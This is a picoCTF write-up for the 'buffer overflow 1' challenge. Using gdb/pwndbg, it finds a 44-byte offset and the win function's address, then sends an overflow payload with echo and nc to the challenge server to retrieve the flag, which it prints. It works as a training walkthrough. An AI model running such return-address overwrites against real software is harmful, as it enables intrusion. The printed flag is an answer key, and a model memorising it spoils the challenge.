# buffer overflow 1


Description
Control the return address
Additional details will be available after launching your challenge instance.


---

Looking through the source code provided .

---

<img width="1193" alt="Screenshot 2024-04-10 at 2 52 05 AM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/20281804-97d9-44fc-bf52-fdd21db36ac1">

---

#### we need to over flow the dangerous gets to execute the win function that will print out the flag..

So let's find the offset of the binary.

I'm goona use gdb.

```
❯ sudo gdb vuln
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 156 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from vuln...
(No debugging symbols found in vuln)
------- tip of the day (disable with set show-tips off) -------
break-if-taken and break-if-not-taken commands sets breakpoints after a given jump instruction was taken or not
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /home/lynk/picoCTF/buffer-overflow-1/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────
*EAX  0x41
*EBX  0x6161616a ('jaaa')
*ECX  0xffffd40c ◂— 0x2f886900
*EDX  0x1
*EDI  0xf7ffcba0 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 (__libc_csu_init) ◂— endbr32 
*EBP  0x6161616b ('kaaa')
*ESP  0xffffd490 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x6161616c ('laaa')
─────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────
Invalid address 0x6161616c










─────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────
00:0000│ esp 0xffffd490 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffffd494 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffffd498 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffffd49c ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffffd4a0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffffd4a4 ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffffd4a8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffffd4ac ◂— 'taaauaaavaaawaaaxaaayaaa'
───────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────
 ► 0 0x6161616c
   1 0x6161616d
   2 0x6161616e
   3 0x6161616f
   4 0x61616170
   5 0x61616171
   6 0x61616172
   7 0x61616173
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
pwndbg>
```

---

so the offset is at 44

now let's craft our payload

basically we need 44 charcters + address of the win function to overflow and get the flag.

lets find the address of win function in gdb

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
pwndbg> disass win
Dump of assembler code for function win:
   0x080491f6 <+0>:	endbr32
   0x080491fa <+4>:	push   ebp
   0x080491fb <+5>:	mov    ebp,esp
   0x080491fd <+7>:	push   ebx
   0x080491fe <+8>:	sub    esp,0x54
   0x08049201 <+11>:	call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049206 <+16>:	add    ebx,0x2dfa
   0x0804920c <+22>:	sub    esp,0x8
   0x0804920f <+25>:	lea    eax,[ebx-0x1ff8]
   0x08049215 <+31>:	push   eax
   0x08049216 <+32>:	lea    eax,[ebx-0x1ff6]
   0x0804921c <+38>:	push   eax
   0x0804921d <+39>:	call   0x80490c0 <fopen@plt>
   0x08049222 <+44>:	add    esp,0x10
   0x08049225 <+47>:	mov    DWORD PTR [ebp-0xc],eax
   0x08049228 <+50>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x0804922c <+54>:	jne    0x8049258 <win+98>
   0x0804922e <+56>:	sub    esp,0x4
   0x08049231 <+59>:	lea    eax,[ebx-0x1fed]
   0x08049237 <+65>:	push   eax
   0x08049238 <+66>:	lea    eax,[ebx-0x1fd8]
   0x0804923e <+72>:	push   eax
   0x0804923f <+73>:	lea    eax,[ebx-0x1fa3]
   0x08049245 <+79>:	push   eax
   0x08049246 <+80>:	call   0x8049040 <printf@plt>
   0x0804924b <+85>:	add    esp,0x10
   0x0804924e <+88>:	sub    esp,0xc
   0x08049251 <+91>:	push   0x0
   0x08049253 <+93>:	call   0x8049090 <exit@plt>
   0x08049258 <+98>:	sub    esp,0x4
   0x0804925b <+101>:	push   DWORD PTR [ebp-0xc]
   0x0804925e <+104>:	push   0x40
   0x08049260 <+106>:	lea    eax,[ebp-0x4c]
   0x08049263 <+109>:	push   eax
   0x08049264 <+110>:	call   0x8049060 <fgets@plt>
   0x08049269 <+115>:	add    esp,0x10
   0x0804926c <+118>:	sub    esp,0xc
   0x0804926f <+121>:	lea    eax,[ebp-0x4c]
   0x08049272 <+124>:	push   eax
   0x08049273 <+125>:	call   0x8049040 <printf@plt>
   0x08049278 <+130>:	add    esp,0x10
   0x0804927b <+133>:	nop
   0x0804927c <+134>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804927f <+137>:	leave
   0x08049280 <+138>:	ret
End of assembler dump.
pwndbg>

```

address of the win function is ```0x080491f6```

We need the address in the reverse order......... let me show you the final payload.

we will use python3

```python
❯ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> "A" * 44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> pwn.p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> exit()
❯ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 51005
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}

```


flag: ```picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}```

---



